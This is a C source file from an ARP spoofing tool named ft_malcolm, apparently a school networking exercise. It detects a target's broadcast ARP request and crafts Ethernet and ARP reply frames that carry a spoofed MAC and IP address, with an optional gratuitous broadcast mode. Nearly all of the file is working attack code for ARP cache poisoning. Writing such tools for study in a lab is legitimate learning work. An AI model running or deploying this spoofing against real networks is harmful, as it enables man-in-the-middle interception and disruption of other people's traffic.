#include "ft_malcolm.h"

int process_packet(unsigned char *buffer, t_malcolm *data) {
    struct ethhdr *eth_header = (struct ethhdr *)buffer;
    struct arppckt *arp_packet = (struct arppckt *)(buffer + sizeof(struct ethhdr));
    int op_code = -1;

    unsigned char *src_mac = eth_header->h_source;
    unsigned char *dst_mac = eth_header->h_dest;
    if (!ft_memcmp(src_mac, data->target_mac, ETH_ALEN) && !ft_memcmp(dst_mac, data->broadcast_addr, ETH_ALEN))
    {
        if (ntohs(arp_packet->ar_pro) != ETH_P_IP || ntohs(arp_packet->ar_hrd) != ARPHRD_ETHER)
            return (1);

        op_code = ntohs(arp_packet->ar_op);
        if (op_code != ARPOP_REQUEST)
            return (1);
        log_msg("An ARP request has been broadcast.", NULL);
        log_mac_address(" mac address of request: ", arp_packet->ar_sha);
        log_ip_address(" IP address of request: ", arp_packet->ar_sip);
        if (data->verbose)
            log_packet(buffer);
        return (0);
    }
    return (1);
}

void    create_arp_packet(unsigned char *packet, int type, t_malcolm *data)
{
    struct arppckt arp;

    arp.ar_hrd = htons(1); // Ethernet
    arp.ar_pro = htons(0x0800); // IPv4 0x0800
    arp.ar_hln = ETH_ALEN; // MAC address length
    arp.ar_pln = IPV4_LENGTH; // IP address length
    arp.ar_op = htons(type); // ARP reply | ARP request
    ft_memcpy(arp.ar_sha, data->spoofed_mac, sizeof(data->spoofed_mac));
    ft_memcpy(arp.ar_sip, data->spoofed_ip, sizeof(data->spoofed_ip));
    if (data->gratutious)
    {
        ft_memcpy(arp.ar_tha, data->broadcast_addr, sizeof(data->broadcast_addr));
        ft_memcpy(arp.ar_tip, data->spoofed_ip, sizeof(data->spoofed_ip));
    }
    else 
    {
        ft_memcpy(arp.ar_tha, data->target_mac, sizeof(data->target_mac));
        ft_memcpy(arp.ar_tip, data->target_ip, sizeof(data->target_ip));
    }
    ft_memcpy(packet, &arp, sizeof(arp));
}

void    create_ethernet_packet(unsigned char *packet, t_malcolm *data)
{
    struct ethhdr ehdr;

    ehdr.h_proto = htons(0x0806); // ARP
    ft_memcpy(ehdr.h_source, data->spoofed_mac, sizeof(data->spoofed_mac));
    if (data->gratutious)
        ft_memcpy(ehdr.h_dest, data->broadcast_addr, sizeof(data->broadcast_addr)); 
    else 
        ft_memcpy(ehdr.h_dest, data->target_mac, sizeof(data->target_mac));
    ft_memcpy(packet, &ehdr, sizeof(ehdr));
}

void    create_reply_packet(unsigned char *packet, t_malcolm *data)
{
    create_ethernet_packet(packet, data);
    create_arp_packet((packet + sizeof(struct ethhdr)), 2, data);
    uint32_t crc = calculate_crc32(packet, ETH_FRAME_SIZE);
    ft_memcpy((packet + ETH_FRAME_SIZE), &crc, sizeof(crc));
}